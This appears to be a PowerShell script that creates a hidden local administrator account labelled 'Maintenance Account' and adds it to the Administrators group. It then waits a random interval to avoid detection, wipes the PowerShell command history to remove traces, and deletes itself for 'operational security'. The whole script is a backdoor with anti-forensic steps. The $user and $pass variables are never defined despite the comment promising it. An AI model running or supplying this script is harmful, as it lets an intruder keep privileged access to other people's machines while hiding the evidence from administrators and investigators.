# Define username and password
# Create the new user with the specified password
New-LocalUser -Name $user -Password (ConvertTo-SecureString $pass -AsPlainText -Force) -AccountNeverExpires -Description "Maintenance Account"

# Add the new user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $user

# Optional: Implement a random delay to avoid detection patterns
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 300)

# Optional: Clear PowerShell history to remove traces
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Clear-Content -Path $historyPath
}

# Optional: Self-delete the script for operational security
$myInvocation = (Get-Variable MyInvocation -Scope 1).Value
Remove-Item $myInvocation.MyCommand.Path
